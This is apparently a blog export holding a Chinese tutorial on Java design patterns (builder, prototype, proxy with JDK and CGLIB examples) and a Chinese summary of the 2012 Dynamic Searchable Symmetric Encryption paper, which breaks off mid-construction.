ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"C:\\\\Users\\\\Think\\\\Desktop\\\\b.txt\"));\n        //将c1对象写出到文件中\n        oos.writeObject(c1);\n        oos.close();\n\n        //创建对象出入流对象\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"C:\\\\Users\\\\Think\\\\Desktop\\\\b.txt\"));\n        //读取对象\n        Citation c2 = (Citation) ois.readObject();\n        //获取c2奖状所属学生对象\n        Student stu1 = c2.getStu();\n        stu1.setName(\"李四\");\n\n        //判断stu对象和stu1对象是否是同一个对象\n        System.out.println(\"stu和stu1是同一个对象？\" + (stu == stu1));\n\n        c1.show();\n        c2.show();\n    }\n}\n/**\n*stu和stu1是同一个对象？false\n*张三同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！\n*李四同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！\n*/\n```\n\n> 注意：Citation类和Student类必须实现Serializable接口，否则会抛NotSerializableException异常。\n\n## ❺建造者模式\n\n### 1.简述\n\n将一个复杂对象的构建与表示分离，使得同样的构建过程可以创建不同的表示。这个模式适用于：某个对象的构建过程复杂的情况。\n\n* 分离了部件的构造(由Builder来负责)和装配(由Director负责)。 从而可以构造出复杂的对象。\n* 由于实现了构建和装配的解耦。不同的构建器，相同的装配，也可以做出不同的对象；相同的构建器，不同的装配顺序也可以做出不同的对象。也就是实现了构建算法、装配算法的解耦，实现了更好的复用。\n* 建造者模式可以将部件和其组装过程分开，一步一步创建一个复杂的对象。用户只需要指定复杂对象的类型就可以得到该对象，而无须知道其内部的具体构造细节。\n\n建造者模式包含如下角色：\n\n* 抽象建造者类（Builder）：这个接口规定要实现复杂对象的那些部分的创建，并不涉及具体部件对象的创建。\n\n* 具体建造者类（ConcreteBuilder）：实现 Builder 接口，完成复杂产品的各个部件的具体创建方法。在构造过程完成后，提供产品的实例。 \n\n* 产品类（Product）：要创建的复杂对象。\n\n* 指挥者类（Director）：调用具体建造者来创建复杂对象的各个部分，在指导者中不涉及具体产品的信息，只负责保证对象各部分完整创建或按某种顺序创建。 \n\n![](https://img.jwt1399.top/img/202211112144442.png)\n\n### 2.实例\n\n**【例】创建共享单车**\n\n生产自行车是一个复杂的过程，它包含了车架，车座等组件的生产。而车架又有碳纤维，铝合金等材质的，车座有橡胶，真皮等材质。对于自行车的生产就可以使用建造者模式。\n\n这里Bike是产品，包含车架，车座等组件；Builder是抽象建造者，MobikeBuilder和OfoBuilder是具体的建造者；Director是指挥者。类图如下：\n\n![](../images/Java-设计模式/image-20221111214538601.png)\n\n具体的代码如下：\n\n```java\n//自行车类\npublic class Bike {\n    private String frame;\n    private String seat;\n\n    public String getFrame() {\n        return frame;\n    }\n\n    public void setFrame(String frame) {\n        this.frame = frame;\n    }\n\n    public String getSeat() {\n        return seat;\n    }\n\n    public void setSeat(String seat) {\n        this.seat = seat;\n    }\n}\n\n// 抽象 builder 类\npublic abstract class Builder {\n\n    protected Bike mBike = new Bike();\n\n    public abstract void buildFrame();\n    public abstract void buildSeat();\n    public abstract Bike createBike();\n}\n\n//摩拜单车Builder类\npublic class MobikeBuilder extends Builder {\n\n    @Override\n    public void buildFrame() {\n        mBike.setFrame(\"铝合金车架\");\n    }\n\n    @Override\n    public void buildSeat() {\n        mBike.setSeat(\"真皮车座\");\n    }\n\n    @Override\n    public Bike createBike() {\n        return mBike;\n    }\n}\n\n//ofo单车Builder类\npublic class OfoBuilder extends Builder {\n\n    @Override\n    public void buildFrame() {\n        mBike.setFrame(\"碳纤维车架\");\n    }\n\n    @Override\n    public void buildSeat() {\n        mBike.setSeat(\"橡胶车座\");\n    }\n\n    @Override\n    public Bike createBike() {\n        return mBike;\n    }\n}\n\n//指挥者类\npublic class Director {\n    private Builder mBuilder;\n\n    public Director(Builder builder) {\n        mBuilder = builder;\n    }\n\n    public Bike construct() {\n        mBuilder.buildFrame();\n        mBuilder.buildSeat();\n        return mBuilder.createBike();\n    }\n}\n\n//测试类\npublic class Client {\n    public static void main(String[] args) {\n        showBike(new OfoBuilder());\n        showBike(new MobikeBuilder());\n    }\n    private static void showBike(Builder builder) {\n        Director director = new Director(builder);\n        Bike bike = director.construct();\n        System.out.println(bike.getFrame());\n        System.out.println(bike.getSeat());\n    }\n}\n```\n\n**注意：**上面示例是 Builder模式的常规用法，指挥者类 Director 在建造者模式中具有很重要的作用，它用于指导具体构建者如何构建产品，控制调用先后次序，并向调用者返回完整的产品类，但是有些情况下需要简化系统结构，可以把指挥者类和抽象建造者进行结合\n\n```java\n// 抽象 builder 类\npublic abstract class Builder {\n\n    protected Bike mBike = new Bike();\n\n    public abstract void buildFrame();\n    public abstract void buildSeat();\n    public abstract Bike createBike();\n    \n    public Bike construct() {\n        this.buildFrame();\n        this.BuildSeat();\n        return this.createBike();\n    }\n}\n```\n\n**说明：**这样做确实简化了系统结构，但同时也加重了抽象建造者类的职责，也不是太符合单一职责原则，如果construct() 过于复杂，建议还是封装到 Director 中。\n\n**优点：**\n\n- 建造者模式的封装性很好。使用建造者模式可以有效的封装变化，在使用建造者模式的场景中，一般产品类和建造者类是比较稳定的，因此，将主要的业务逻辑封装在指挥者类中对整体而言可以取得比较好的稳定性。\n- 在建造者模式中，客户端不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦，使得相同的创建过程可以创建不同的产品对象。\n- 可以更加精细地控制产品的创建过程 。将复杂产品的创建步骤分解在不同的方法中，使得创建过程更加清晰，也更方便使用程序来控制创建过程。\n- 建造者模式很容易进行扩展。如果有新的需求，通过实现一个新的建造者类就可以完成，基本上不用修改之前已经测试通过的代码，因此也就不会对原有功能引入风险。符合开闭原则。\n\n**缺点：**\n\n造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制。\n\n**使用场景：**\n\n建造者（Builder）模式创建的是复杂对象，其产品的各个部分经常面临着剧烈的变化，但将它们组合在一起的算法却相对稳定，所以它通常在以下场合使用。\n\n- 创建的对象较复杂，由多个部件构成，各部件面临着复杂的变化，但构件间的建造顺序是稳定的。\n- 创建对象的算法独立于该对象的组成部分以及它们的装配方式，即产品的构建过程和最终的表示是独立的。\n\n### 3.模式扩展：链式编程\n\n建造者模式除了上面的用途外，在开发中还有一个常用的使用方式，就是当一个类构造器需要传入很多参数时，如果创建这个类的实例，代码可读性会非常差，而且很容易引入错误，此时就可以利用建造者模式进行重构。\n\n重构前代码如下：\n\n```java\npublic class Phone {\n    private String cpu;\n    private String screen;\n    private String memory;\n    private String mainboard;\n\n    public Phone(String cpu, String screen, String memory, String mainboard) {\n        this.cpu = cpu;\n        this.screen = screen;\n        this.memory = memory;\n        this.mainboard = mainboard;\n    }\n\n    public String getCpu() {\n        return cpu;\n    }\n\n    public void setCpu(String cpu) {\n        this.cpu = cpu;\n    }\n\n    public String getScreen() {\n        return screen;\n    }\n\n    public void setScreen(String screen) {\n        this.screen = screen;\n    }\n\n    public String getMemory() {\n        return memory;\n    }\n\n    public void setMemory(String memory) {\n        this.memory = memory;\n    }\n\n    public String getMainboard() {\n        return mainboard;\n    }\n\n    public void setMainboard(String mainboard) {\n        this.mainboard = mainboard;\n    }\n\n    @Override\n    public String toString() {\n        return \"Phone{\" +\n                \"cpu='\" + cpu + '\\'' +\n                \", screen='\" + screen + '\\'' +\n                \", memory='\" + memory + '\\'' +\n                \", mainboard='\" + mainboard + '\\'' +\n                '}';\n    }\n}\n\npublic class Client {\n    public static void main(String[] args) {\n        //构建Phone对象\n        Phone phone = new Phone(\"intel\",\"三星屏幕\",\"金士顿\",\"华硕\");\n        System.out.println(phone);\n    }\n}\n```\n\n构建Phone对象，传递了四个参数，如果参数更多呢？代码的可读性及使用的成本就是比较高。\n\n重构后代码：\n\n> lombok中@Builder注解可实现类似功能（链式编程）\n\n```java\npublic class Phone {\n\n    private String cpu;\n    private String screen;\n    private String memory;\n    private String mainboard;\n\n    private Phone(Builder builder) {\n        cpu = builder.cpu;\n        screen = builder.screen;\n        memory = builder.memory;\n        mainboard = builder.mainboard;\n    }\n\n    public static final class Builder {\n        private String cpu;\n        private String screen;\n        private String memory;\n        private String mainboard;\n\n        public Builder() {}\n\n        public Builder cpu(String val) {\n            cpu = val;\n            return this;\n        }\n        public Builder screen(String val) {\n            screen = val;\n            return this;\n        }\n        public Builder memory(String val) {\n            memory = val;\n            return this;\n        }\n        public Builder mainboard(String val) {\n            mainboard = val;\n            return this;\n        }\n        public Phone build() {\n            return new Phone(this);}\n    }\n    @Override\n    public String toString() {\n        return \"Phone{\" +\n                \"cpu='\" + cpu + '\\'' +\n                \", screen='\" + screen + '\\'' +\n                \", memory='\" + memory + '\\'' +\n                \", mainboard='\" + mainboard + '\\'' +\n                '}';\n    }\n}\n\npublic class Client {\n    public static void main(String[] args) {\n        Phone phone = new Phone.Builder()\n                .cpu(\"intel\")\n                .mainboard(\"华硕\")\n                .memory(\"金士顿\")\n                .screen(\"三星\")\n                .build();\n        System.out.println(phone);\n    }\n}\n```\n\n重构后的代码在使用起来更方便，某种程度上也可以提高开发效率。从软件设计上，对程序员的要求比较高。\n\n## ❻创建型模式对比\n\n### 1.工厂方法模式VS建造者模式\n\n工厂方法模式注重的是整体对象的创建方式；而建造者模式注重的是部件构建的过程，意在通过一步一步地精确构造创建出一个复杂的对象。\n\n我们举个简单例子来说明两者的差异，如要制造一个超人，如果使用工厂方法模式，直接产生出来的就是一个力大无穷、能够飞翔、内裤外穿的超人；而如果使用建造者模式，则需要组装手、头、脚、躯干等部分，然后再把内裤外穿，于是一个超人就诞生了。\n\n### 2.抽象工厂模式VS建造者模式\n\n抽象工厂模式实现对产品家族的创建，一个产品家族是这样的一系列产品：具有不同分类维度的产品组合，采用抽象工厂模式则是不需要关心构建过程，只关心什么产品由什么工厂生产即可。\n\n建造者模式则是要求按照指定的蓝图建造产品，它的主要目的是通过组装零配件而产生一个新产品。\n\n如果将抽象工厂模式看成汽车配件生产工厂，生产一个产品族的产品，那么建造者模式就是一个汽车组装工厂，通过对部件的组装可以返回一辆完整的汽车。\n\n# ②结构型模式-7种\n\n> 结构型模式描述如何将类或对象按某种布局组成更大的结构。分为类结构型模式和对象结构型模式，前者采用继承机制来组织接口和类，后者釆用组合或聚合来组合对象。\n>\n> 由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象结构型模式比类结构型模式具有更大的灵活性。\n\n## ❶代理模式\n\n### 0.简述\n\n由于某些原因需要给某对象提供一个代理以控制对该对象的访问。这时，访问对象不适合或者不能直接引用目标对象，代理对象作为访问对象和目标对象之间的中介。\n\nJava中的代理按照代理类生成时机不同又分为静态代理和动态代理。\n\n- 静态代理代理类在**编译期就生成**\n- 动态代理代理类则是在**Java运行时动态生成**。\n  - 动态代理又有**JDK代理**和**CGLib代理**两种。\n\n代理（Proxy）模式分为三种角色：\n\n* 抽象主题（Subject）类： 通过接口或抽象类声明真实主题和代理对象实现的业务方法。\n* 真实主题（Real Subject）类： 实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象。\n* 代理（Proxy）类 ： 提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。\n\n### 1.静态代理\n\n【例】火车站卖票\n\n如果要买火车票的话，需要去火车站买票，坐车到火车站，排队等一系列的操作，显然比较麻烦。而火车站在多个地方都有代售点，我们去代售点买票就方便很多了。这个例子其实就是典型的代理模式，火车站是目标对象，代售点是代理对象。类图如下：\n\n![](https://img.jwt1399.top/img/202211121627835.png)\n\n```java\n//卖票接口\npublic interface SellTickets {\n    void sell();\n}\n\n//火车站  火车站具有卖票功能，所以需要实现SellTickets接口\npublic class TrainStation implements SellTickets {\n\n    public void sell() {\n        System.out.println(\"火车站卖票\");\n    }\n}\n\n//代售点\npublic class ProxyPoint implements SellTickets {\n\n    private TrainStation station = new TrainStation();\n\n    public void sell() {\n        System.out.println(\"代理点收取一些服务费用\");\n        station.sell();\n    }\n}\n\n//测试类\npublic class Client {\n    public static void main(String[] args) {\n        ProxyPoint pp = new ProxyPoint();\n        pp.sell();\n    }\n}\n```\n\n从上面代码中可以看出测试类直接访问的是ProxyPoint类对象，也就是说ProxyPoint作为访问对象和目标对象的中介。同时也对sell方法进行了增强（代理点收取一些服务费用）。\n\n### 2.JDK动态代理\n\nJava中提供了一个动态代理类Proxy，Proxy并不是我们上述所说的代理对象的类，而是提供了一个创建代理对象的静态方法（newProxyInstance方法）来获取代理对象。\n\n代码如下：\n\n```java\n//卖票接口\npublic interface SellTickets {\n    void sell();\n}\n\n//火车站  火车站具有卖票功能，所以需要实现SellTickets接口\npublic class TrainStation implements SellTickets {\n\n    public void sell() {\n        System.out.println(\"火车站卖票\");\n    }\n}\n\n//代理工厂，用来创建代理对象\npublic class ProxyFactory {\n\n    private TrainStation station = new TrainStation();\n\n    public SellTickets getProxyObject() {\n        //使用Proxy获取代理对象\n        /*\n            newProxyInstance()方法参数说明：\n                ClassLoader loader ： 类加载器，用于加载代理类，使用真实对象的类加载器即可\n                Class<?>[] interfaces ： 真实对象所实现的接口，代理模式真实对象和代理对象实现相同的接口\n                InvocationHandler h ： 代理对象的调用处理程序\n         */\n        SellTickets sellTickets = (SellTickets) Proxy.newProxyInstance(station.getClass().getClassLoader(),\n                station.getClass().getInterfaces(),\n                new InvocationHandler() {\n                    /*\n                        InvocationHandler中invoke方法参数说明：\n                            proxy ： 代理对象\n                            method ： 对应于在代理对象上调用的接口方法的 Method 实例\n                            args ： 代理对象调用接口方法时传递的实际参数\n                     */\n                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n\n                        System.out.println(\"代理点收取一些服务费用(JDK动态代理方式)\");\n                        //执行真实对象\n                        Object result = method.invoke(station, args);\n                        return result;\n                    }\n                });\n        return sellTickets;\n    }\n}\n\n//测试类\npublic class Client {\n    public static void main(String[] args) {\n        //获取代理对象\n        ProxyFactory factory = new ProxyFactory();\n        \n        SellTickets proxyObject = factory.getProxyObject();\n        proxyObject.sell();\n    }\n}\n```\n\n执行流程如下：\n\n    1. 在测试类中通过代理对象调用sell()方法\n    2. 根据多态的特性，执行的是代理类（$Proxy0）中的sell()方法\n    3. 代理类（$Proxy0）中的sell()方法中又调用了InvocationHandler接口的子实现类对象的invoke方法\n    4. invoke方法通过反射执行了真实对象所属类(TrainStation)中的sell()方法\n\n###  3.CGLIB动态代理\n\n如果没有定义SellTickets接口，只定义了TrainStation(火车站类)。很显然JDK代理是无法使用了，因为JDK动态代理要求必须定义接口，对接口进行代理。\n\nCGLIB是一个功能强大，高性能的代码生成包。它为没有实现接口的类提供代理，为JDK的动态代理提供了很好的补充。CGLIB是第三方提供的包，所以需要引入jar包的坐标：\n\n```xml\n<dependency>\n    <groupId>cglib</groupId>\n    <artifactId>cglib</artifactId>\n    <version>2.2.2</version>\n</dependency>\n```\n\n```java\n//火车站\npublic class TrainStation {\n\n    public void sell() {\n        System.out.println(\"火车站卖票\");\n    }\n}\n\n//代理工厂\npublic class ProxyFactory implements MethodInterceptor {\n\n    private TrainStation target = new TrainStation();\n\n    public TrainStation getProxyObject() {\n        //创建Enhancer对象，类似于JDK动态代理的Proxy类，下一步就是设置几个参数\n        Enhancer enhancer =new Enhancer();\n        //设置父类的字节码对象\n        enhancer.setSuperclass(target.getClass());\n        //设置回调函数\n        enhancer.setCallback(this);\n        //创建代理对象\n        TrainStation obj = (TrainStation) enhancer.create();\n        return obj;\n    }\n\n    /*\n        intercept方法参数说明：\n            o ： 代理对象\n            method ： 真实对象中的方法的Method实例\n            args ： 实际参数\n            methodProxy ：代理对象中的方法的method实例\n     */\n    public TrainStation intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) throws Throwable {\n        System.out.println(\"代理点收取一些服务费用(CGLIB动态代理方式)\");\n        TrainStation result = (TrainStation) methodProxy.invokeSuper(o, args);\n        return result;\n    }\n}\n\n//测试类\npublic class Client {\n    public static void main(String[] args) {\n        //创建代理工厂对象\n        ProxyFactory factory = new ProxyFactory();\n        //获取代理对象\n        TrainStation proxyObject = factory.getProxyObject();\n\n        proxyObject.sell();\n    }\n}\n```\n\n### 4.总结\n\n* jdk代理和CGLIB代理\n\n\n使用CGLib实现动态代理，CGLib底层采用ASM字节码生成框架，使用字节码技术生成代理类，在JDK1.6之前比使用Java反射效率要高。唯一需要注意的是，**CGLib不能对声明为final的类或者方法进行代理，因为CGLib原理是动态生成被代理类的子类。**\n\nJDK1.8的时候，JDK代理效率高于CGLib代理。所以如果有接口使用JDK动态代理，如果没有接口使用CGLIB代理。\n\n* 动态代理和静态代理\n\n\n动态代理与静态代理相比较，最大的好处是接口中声明的所有方法都被转移到调用处理器一个集中的方法中处理（InvocationHandler.invoke）。这样，在接口方法数量比较多的时候，我们可以进行灵活处理，而不需要像静态代理那样每一个方法进行中转。\n\n如果接口增加一个方法，静态代理模式除了所有实现类需要实现这个方法外，所有代理类也需要实现此方法。增加了代码维护的复杂度。而动态代理不会出现该问题\n\n**优点：**\n\n- 代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用；\n- 代理对象可以扩展目标对象的功能；\n- 代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度；\n\n**缺点：**\n\n* 增加了系统的复杂度；\n\n**使用场景：**\n\n* 远程（Remote）代理\n\n  本地服务通过网络请求远程服务。为了实现本地到远程的通信，我们需要实现网络通信，处理其中可能的异常。为良好的代码设计和可维护性，我们将网络通信部分隐藏起来，只暴露给本地服务一个接口，通过该接口即可访问远程服务提供的功能，而不必过多关心通信部分的细节。\n\n* 防火墙（Firewall）代理\n\n  当你将浏览器配置成使用代理功能时，防火墙就将你的浏览器的请求转给互联网；当互联网返回响应时，代理服务器再把它转给你的浏览器。\n\n* 保护（Protect or Access）代理\n\n  控制对一个对象的访问，如果需要，可以给不同的用户提供不同级别的使用权限。\n\n\n\n\n\n\n\n## ❷适配器模式\n\n## ❸装饰者模式\n\n## ❹桥接模式\n\n## ❺外观模式\n\n## ❻组合模式\n\n## ❼享元模式\n\n\n\n\n\n\n\n# ③行为型模式-11种\n\n\n\n\n\n\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["设计模式"],"categories":["JavaSE"]},{"title":"可搜索加密：DSSE方案","url":"/posts/62723.html","content":"\n**论文名称：《Dynamic Searchable Symmetric Encryption》**\n\n- 作者：Seny Kamara、Charalampos Papamanthou、Tom Roeder \n- 单位：微软研究院、加州大学伯克利分校\n- 会议：[CCS '12: Proceedings of the 2012 ACM conference on Computer and communications](https://dl.acm.org/doi/10.1145/2382196.2382298)【CCF A】\n- 时间：2012年10月\n\n|   多关键字   |  模糊搜索  |      可验证       |\n| :----------: | :--------: | :---------------: |\n|      ✅       |     ❌      |         ❌         |\n| **动态更新** | **安全性** |    **复杂度**     |\n|      ✅       |  IND-CKA2  | 亚线性 $O(\\#f_w)$ |\n\n## 1、方案简介\n\n任何实用的SSE方案都应该（至少）满足以下属性：**亚线性搜索时间**、**抵御自适应选择关键字攻击的安全性**、\n\n**紧凑的索引**以及**有效地添加和删除文件的能力**。本文提出了第一个SSE方案来满足上述所有属性。我们方案扩展了\n\n倒排索引方法，并为SSE的设计引入了新技术。\n\n**我们的贡献**：\n\n1. 我们提出了**动态SSE的形式化安全定义**。\n2. 我们构造了第一个SSE方案，它是**动态的**，**CKA2-secure** 的，并且实现了**最优的搜索时间**。\n3. 我们描述了基于[可搜索的对称加密：改进的定义和高效的结构](https://dl.acm.org/doi/abs/10.5555/2590701.2590705)的倒排索引方法的SSE方案的第一个实现和评估。我们的实现表明，这种类型的SSE方案非常有效。\n\n## 2、安全性\n\n> 服务器可以了解到一些客户端查询的有限信息。例如它知道正在搜索的关键字都包含在加密为$c_{w}$ 的文件中。\n\nSSE安全性\n\n- （1）加密的索引 $\\gamma$  和密文 $c$ 除了文件的数量 $n$ 和它们的长度之外，不泄露关于 $f$ 的任何信息；\n\n- （2）加密的索引 $\\gamma$ 和令牌 $T_{w}$ 至多揭示了搜索 $I_{w}$ 的结果。\n\n**CKA1——抵抗选择关键字攻击的安全性**\n\n- 只有当客户的查询独立于索引和先前的结果时，才能保证安全性。\n\n**CKA2——抵抗自适应选择关键字攻击的安全性**\n\n- 即使客户端的查询是基于加密的索引和先前查询的结果，也能保证安全性。\n- 即使存在可以在协议进行时破坏参与者的对手的情况下也能保持其安全性，则称其自适应安全。\n\n------\n\n动态SSE方案必须允许添加和删除文件。这两种操作都是使用令牌来处理的。\n\n- 为了添加文件 $f$，客户端生成添加令牌 $\\tau_{a}$，给定  $\\tau_{a}$ 和 $\\gamma$，服务器可以更新加密的索引 $\\gamma$。\n\n- 为了删除文件 $f$，客户端生成删除令牌 $\\tau_{d}$，服务器用它来更新 $\\gamma$。\n\n动态SSE方案要求的安全保证：\n\n- （1）给定加密的索引 $\\gamma$ 和密文序列 $c$，任何对手都无法获知关于文件 $f$ 的任何信息；\n\n- （2）给定了 token 序列 $\\tau=(\\tau_{1},...,\\tau_{n})$。对于自适应生成的查询序列 $q=(q_{1},...,q_{n})$（它可以用于搜索、添加或删除操作），任何对手都无法获知关于 $f$ 或 $q$ 的任何信息。\n\n## 3、方案概述\n\n|    符号    | 含义                           |\n| :--------: | :----------------------------- |\n|    $f$     | 明文序列 $f=(f_{1},...,f_{n})$ |\n|  $f_{w}$   | 包含$w$的明文                  |\n|    $c$     | 密文序列 $c=(c_{1},...,c_{n})$ |\n|  $c_{w}$   | 包含$w$的密文                  |\n|  $I_{w}$   | 包含$w$的文件标识符 $I_w∈c$    |\n|    $δ$     | 索引                           |\n|  $\\gamma$  | 加密的索引                     |\n| $\\tau_{s}$ | 搜索令牌                       |\n| $\\tau_{a}$ | 添加令牌                       |\n| $\\tau_{d}$ | 删除令牌                       |\n|   $\\#f$    | $f$ 中文件的数量               |\n|  $\\#f_w$   | 是包含关键字$w$的文件数量      |\n|   $\\#W$    | 关键字空间的大小               |\n\n我们的方案是基于倒排索引SSE-1结构的扩展。尽管 SSE-1 是实用的（它对于小常数是渐近最优的），但它确实有一些限制，使得它不适合直接用于加密云存储系统中：\n\n​    （1）它只能抵抗非自适应选择关键字攻击（CKA1），这意味着它只能为批量执行搜索的客户端提供安全性；\n\n​    （2）它不是显式动态的，它只能支持使用通用和低效技术的动态操作。\n\n**SSE-1 construction**\n\n为了加密文件集合 $f$，该方案为每个关键字 $w∈W$ 构造一个列表 $L_{w}$，每个列表 $L_{w}$ 由 $\\#\\rm f_{w}$ 个节点$(N_{1},...,N_{f_{w}})$，它们被存储在搜索数组 $A_s$ 中的随机位置。节点 $N_{i}$ 被定义为$N_{i}=⟨id,addr_{s}(N_{i+1})⟩$，其中 $id$ 是包含 $w$ 的文件的唯一文件标识符，$addr_{s}(N)$ 表示在范围 $A_{s}$ 中的节点 $N$ 的位置。\n\n> 为了防止$A_{s}$的大小泄露有关 $f$ 的统计信息，建议$A_{s}$的大小至少为$|c|/8$，和 使用长度适当的随机字符串填充未使用的单元格。\n\n对于每个关键字 $w$，将指向 $L_{w}$ 头部的指针插入到搜索表 $T_{s}$ 下的搜索键 $F_{K_{1}}(w)$中 ，然后在生成的密钥 $G_{K_{2}}(w)$ 下使用 SKE= (Gen,Enc,Dec) 对每个列表进行加密。\n\n如果要搜索关键字 w，客户端发送 $F_{K_{1}}(w)$ 和 $G_{K_{2}}(w)$ 就足够了。然后，服务器可以使用 $F_{K_{1}}(w)$ 和 $T_{s}$ 来恢复指向 $L_{w}$ 头部的指针，并使用 $G_{K_{2}}(w)$ 来解密列表并恢复包含 $w$ 的文件的标识符。只要 T 支持 O(1) 时间复杂度查找（可以使用哈希表实现），服务器的总搜索时间在 $\\#f_{w}$ 中是线性的，这是最优的。\n\n------\n\n使用SSE-1动态。如上所述，SSE-1的限制有两方面：\n\n（1）它只是CKA1-secure的\n\n（2）它不是显式动态的。\n\n第一个限制可以通过要求 SKE 是非承诺的就可以相对容易地解决(事实上，该工作中提出的 CKA2 安全 SSE 结构使用了一个简单的基于 PRF 的非承诺加密方案)。\n\n- 非承诺性（non-committin）：即方案的密文和安全参数与随机数是不可区分的！\n\n然而，第二个限制就不那么容易克服了。难点在于文件的添加、删除或修改需要服务器在存储在$A_{s}$中的加密列\n\n表中添加、删除或修改节点。    这对于服务器来说很难做到，因为：\n\n​    （1）当删除文件 $f$ 时，它不知道（在A中）与 $f$ 对应的节点存储在哪里；\n\n​    （2）当从列表中插入或删除一个节点时，它不能修改前一个节点的指针，因为它是加密的；\n\n​    （3）添加一个节点后，它不知道 $A_{s}$ 中哪些位置是空闲的。\n\n​    在高层次上，我们处理这些限制如下：\n\n1. （文件删除）我们添加了一个额外的（加密的）数据结构$A_{d}$，称为删除数组，服务器可以查询（通过客户端提供的令牌），以恢复指向被删除文件对应节点的指针。更准确地说，删除数组为每个文件存储一个指向 $A_{s}$ 中的节点的节点列表，如果文件 $f$ 被删除，这些节点应该被删除。所以搜索数组中的每个节点在删除数组中都有一个对应的节点，删除数组中的每个节点都指向搜索数组中的一个节点。在整个过程中，我们将把这样的节点称为对偶，并编写$N^*$ 来指代节点$N$的对偶。\n\n2. （指针修改）我们使用同态加密方案对存储在节点中的指针进行加密。这类似于[23]中van Liesdonk等人用来修改他们构造的加密搜索结构的方法。通过向服务器提供适当值的加密，它就可以修改指针，而不需要解密节点。我们使用“标准”对称加密方案，该方案包括将消息与PRF的输出进行异或运算。这个简单的构造还有一个优点，即不提交（在私有密钥设置中），我们可以利用这个优点来实现CKA2安全性。\n\n3. （内存管理）为了跟踪$A_{s}$中的哪些位置是空闲的，我们添加并管理额外的空间，包括服务器用来添加新节点的free列表。\n\n## 4、具体实现\n\n### Prepare\n\n$$\nDSSE=(Gen,Enc,SrchToken,AddToken,DelToken,Search,Add,Del,Dec)\n$$\n\n| 序号 |                      算法                      |       描述       |\n| :--: | :--------------------------------------------: | :--------------: |\n|  ①   |            $K\\leftarrow Gen(1^{k})$            |   密钥生成算法   |\n|  ②   |        $(\\gamma,c)\\leftarrow Enc(K,f)$         |   索引生成算法   |\n|  ③   |      $\\tau_{s}\\leftarrow SrchToken(K,w)$       |   陷门生成算法   |\n|  ④   |   $(\\tau_{a},c_{f})\\leftarrow AddToken(K,f)$   | 添加令牌生成算法 |\n|  ⑤   |      $\\tau_{d} \\leftarrow DelToken(K,f)$       | 删除令牌生成算法 |\n|  ⑥   |       $I_{w}:=Search(\\gamma,c,\\tau_{s})$       |     搜索算法     |\n|  ⑦   | $(\\gamma',c'):=Add(\\gamma,c,\\tau_{a},c_{new})$ |   添加文件算法   |\n|  ⑧   |     $(\\gamma',c'):=Del(\\gamma,c,\\tau_{d})$     |   删除文件算法   |\n|  ⑨   |                 $f:=Dec(K,c)$                  |     解密算法     |\n\n\n\n|             伪随机函数              |\n| :---------------------------------: |\n|  $F:\\{0,1\\}^k×\\{0,1\\}^∗→\\{0,1\\}^k$  |\n|  $G:\\{0,1\\}^k×\\{0,1\\}^∗→\\{0,1\\}^∗$  |\n| $P:\\{0,1\\}^k× \\{0,1\\}^∗→ \\{0,1\\}^k$ |\n|           **随机预言机**            |\n|     $H_1:\\{0,1\\}^∗→ \\{0,1\\}^∗$      |\n|      $H_2:\\{0,1\\}^∗→\\{0,1\\}^∗$      |\n\n\n\n|  符号   |   描述   |\n| :-----: | :------: |\n|  $A_s$  | 搜索数组 |\n| $A_{d}$ | 删除数组 |\n|  $T_s$  |  搜索表  |\n| $T_{d}$ |  删除表  |\n\n\n\n### $Gen(1^k)$\n\n$$\nK = (K_1，K_2，K_3，K_4)←\\{0, 1\\}^k\n$$\n\n### $Enc(K,f)$\n\n1. 设 $A_s$ 和 $A_d$ 为大小为 $|c|/8 +z$ 的数组，设 $T_s$ 和 $T_d$ 分别为大小为 $\\#W$ 和 $\\#f$ 的字典。我们假设 **0** 是一个长度为$(log\\#A_s)$的 0 字符串，free 是一个不在 $W$ 中的单词\n\n- 设 $z∈N$ 为 $free \\ list$ 的初始大小\n\n2. for $w∈W$\n\n创建一个列表 $L_w$ 包含 $\\#f_w$ 个节点 $(N_1，…，N_\\#f_w)$  存储在搜索数组 $A_s$ 的随机位置，并定义为\n$$\nN_i:= (〈id_i,addr_s(N_{i+1})〉⊕H_1(K_w, r_i),r_i)\n$$\n\n- 其中 $id_i$ 是 $f_w$ 中第 i 个文件的 ID，$r_i$ 是随机生成的 $k-bit$ 串，$K_w:=P_{K_3}(w)$ , $addr_s(N_\\#f_{w+1}) =0$\n\n\n\n通过设置 $T_s[F_{K_1}(w)] :=〈addr_s(N_1),addr_d(N^⋆_1)〉⊕G_{K_2}(w)$ 存储一个指向搜索表中 $L_w$ 的第一个节点的指针\n\n- 其中 $N^*$ 是 N 的对偶，即$A_d$ 中的节点，其第四个入口指向$A_s$中的 $N_1$。\n\n3. for $f∈\\rm f$ \n\n创建一个列表 $L_f$ 包含 $\\#f$ 个节点$(D_1，…，D_\\#f_w)$ 存储在搜索数组 $A_d$ 的随机位置，并定义为\n\n$D_i:= 